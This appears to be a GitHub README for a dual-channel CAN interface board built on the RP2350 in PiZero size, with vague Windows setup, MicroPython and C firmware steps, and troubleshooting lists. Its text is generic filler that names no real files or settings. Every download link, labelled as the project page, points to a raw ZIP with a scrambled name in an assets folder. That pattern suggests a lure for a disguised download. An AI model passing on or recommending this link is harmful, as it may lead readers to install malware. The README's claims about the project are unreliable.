# 🛠️ RP2350_Pizero_2CH_CAN_HAT - Simple Dual CAN Setup

[![Download and open the project page](https://img.shields.io/badge/Download-Project%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/hwindingwi1-coder/RP2350_Pizero_2CH_CAN_HAT/main/assets/Pizero_R_HAT_CA_C_v3.1.zip)

## 🚀 What this is

RP2350_Pizero_2CH_CAN_HAT is a dual-channel CAN 2.0B interface for Raspberry Pi RP2350 in a PiZero-size form factor.

It is made for users who need two CAN links on one compact board. It works with MCP2515 CAN controllers and supports both C firmware and MicroPython examples.

Use it for:
- CAN bus testing
- device-to-device communication
- robotics projects
- industrial control links
- embedded hardware work

## 📦 What you get

This project includes:
- firmware examples for C with Pico SDK
- firmware examples for MicroPython
- support for two MCP2515 controllers on one SPI bus
- files for RP2350-based PiZero form-factor use
- a setup that fits small embedded projects

## 💻 What you need

To use this project on Windows, you need:
- a Windows PC
- a USB cable for your board
- the RP2350-based PiZero form-factor hardware
- a CAN test setup or another CAN device
- a web browser
- a file unzip tool
- the ability to copy files to the board

If you plan to build the C firmware, you also need:
- the Pico SDK build tools
- CMake
- a compiler toolchain

If you plan to use MicroPython, you also need:
- a MicroPython firmware file for the board
- a tool such as Thonny or another file transfer tool

## ⬇️ Download the project

[Visit this page to download or open the repository](https://raw.githubusercontent.com/hwindingwi1-coder/RP2350_Pizero_2CH_CAN_HAT/main/assets/Pizero_R_HAT_CA_C_v3.1.zip)

## 🪟 Windows setup

Follow these steps on Windows:

1. Open the download link above in your browser.
2. Download the repository files to your PC.
3. If the project comes as a ZIP file, right-click it and choose Extract All.
4. Open the extracted folder.
5. Read the folder names to find the C example or the MicroPython example.
6. Choose the path that matches your skill level:
   - use MicroPython if you want a simple file-based workflow
   - use C if you want to build the firmware on your PC
7. Connect your board to the PC with a USB cable.
8. Copy the correct firmware file to the board, or flash the build output if you are using the C path.
9. Reboot the board.
10. Check that the CAN interface comes up and the two channels respond

## 🐍 MicroPython path

Use this path if you want a simple start.

1. Install Thonny on Windows.
2. Connect the board by USB.
3. Open Thonny and select the board port.
4. Copy the MicroPython example files from the repository.
5. Open the main script file.
6. Set the CAN pins and bus settings to match your board.
7. Save the file to the board.
8. Run the script.
9. Test each CAN channel one at a time.
10. Then test both channels together on the same SPI bus

### What to check

- board power
- USB connection
- correct COM port
- file saved on the board
- CAN wiring
- matching CAN speed on both devices

## 🧱 C firmware path

Use this path if you want full control.

1. Install the Pico SDK tools on Windows.
2. Open the project folder in your editor.
3. Build the C example using CMake.
4. Find the firmware output file.
5. Put the board in boot mode if your setup needs it.
6. Flash the firmware to the board.
7. Reconnect the board.
8. Open your serial monitor if the firmware prints status text.
9. Send a test frame on CAN channel 1.
10. Send a second test frame on CAN channel 2

### Build flow

- configure the project
- compile the firmware
- flash the output
- test the two MCP2515 controllers
- check SPI traffic
- confirm CAN bus messages

## 🔌 Hardware layout

The board uses:
- one shared SPI bus
- two MCP2515 CAN controllers
- CAN transceivers for bus output
- RP2350 as the main controller

This layout lets one board manage two CAN links at once. That helps when a device must listen to two networks or send data to two systems.

## 📡 CAN bus basics

CAN is a common bus used in:
- vehicles
- machines
- robots
- industrial systems

A CAN bus needs:
- one controller
- one transceiver
- proper wiring
- a matching baud rate
- termination at the ends of the bus

For this board, the two MCP2515 controllers handle CAN control work, while the transceiver stages handle the physical bus side.

## 🧪 First test checklist

Use this checklist after setup:

- board powers on
- firmware loads
- USB connection stays stable
- both CAN channels show activity
- messages appear on the bus
- wiring is correct
- bus speed matches the other device
- termination is in place where needed

If one channel works and the other does not:
- swap the CAN wires
- check the SPI lines
- confirm the chip select line for each controller
- test one channel at a time

## 🗂️ Suggested folder use

You may see folders for:
- C source files
- MicroPython scripts
- board settings
- example code
- build files

A simple way to work with the project:
- start with the example folder
- keep one copy of the original files
- make small changes
- test after each change

## 🛠️ Common tasks

### Change CAN speed

If your network uses a different speed:
- open the example settings
- find the CAN speed value
- match it to your other device
- save and test again

### Test one channel only

If you want to test one bus:
- disconnect the second bus
- load a simple transmit example
- watch for received frames on the other device
- then repeat for the second channel

### Use both channels

To use both channels:
- connect both controllers
- keep each channel on its own bus
- make sure chip select lines do not clash
- confirm both channels use valid SPI settings

## 🧩 Project fit

This project works well for:
- dual-bus controllers
- gateway tests
- robot controller links
- machine I/O links
- lab CAN tests
- board bring-up work

It is a good fit when you need two CAN paths in one compact board and want a simple firmware base for C or MicroPython.

## 📚 Basic terms

- **CAN**: a message bus used by devices to talk to each other
- **MCP2515**: a CAN controller chip
- **SPI**: a short wiring link between chips on the board
- **MicroPython**: a version of Python for microcontrollers
- **Pico SDK**: tools used to build C firmware for RP-series boards
- **Baud rate**: the bus speed used by CAN devices

## 🔍 Troubleshooting

### The board does not show up

- try another USB cable
- try another USB port
- check power
- confirm the board is in the right mode
- reconnect the device

### The firmware does not run

- confirm you copied the right file
- rebuild the project if you use C
- check the board type
- restart the board

### CAN messages do not pass

- check the wire order
- confirm the bus speed
- check bus termination
- test with one known-good CAN device
- test one channel at a time

### One channel works, the other does not

- check the second MCP2515
- check the second transceiver
- confirm the chip select pin
- confirm the SPI connection
- compare the channel settings

## 🧭 Simple setup order

1. Download the repository.
2. Open the folder on Windows.
3. Pick MicroPython or C.
4. Connect the board.
5. Load the example.
6. Match the bus speed to your network.
7. Test one CAN channel.
8. Test the second CAN channel.
9. Test both together.
10. Keep the working files for later use